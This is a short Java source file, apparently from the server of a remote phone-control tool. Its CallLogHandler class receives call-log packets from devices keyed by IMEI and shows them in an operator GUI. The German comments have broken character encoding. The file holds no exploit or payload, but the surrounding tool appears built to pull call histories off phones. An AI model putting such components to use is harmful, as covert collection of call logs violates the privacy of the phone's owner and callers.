package handler;

import server.Server;
import Packet.CallLogPacket;
import Packet.Packet;
import Packet.RawPacket;
import gui.GUI;

/**
 * Diese Klasse ist verarbeitet die CallLogpackete.
 */
public class CallLogHandler implements PacketHandler {
	/**
	 * gui	Die Benutzeroberfl�che
	 */
	private GUI gui;
	/**
	 * channel	Der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI des Ger�ts
	 */
	private String imei;

	/**
	 * Der Konstruktor wei�t die �bergebenen Variablen den Klassenvariablen zu.
	 * @param chan	Der Datenkanal
	 * @param imei	Die IMEI des Ger�ts
	 * @param gui	Die GUI
	 */
	public CallLogHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode erstellt einen Logeintrag.
	 * Zudem wir der Listener f�r den Datenkanal entfernt, da die Daten empfangen wurden.
	 * Zum Schluss wird noch die GUI des Ger�tes mit der IMEI upgedatet, sodass die Daten des Pakets auch angezeigt werden.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server.
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Call log data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		CallLogPacket packet = (CallLogPacket) p;
		gui.updateUserCallLogs(imei, packet.getList());
	}
}
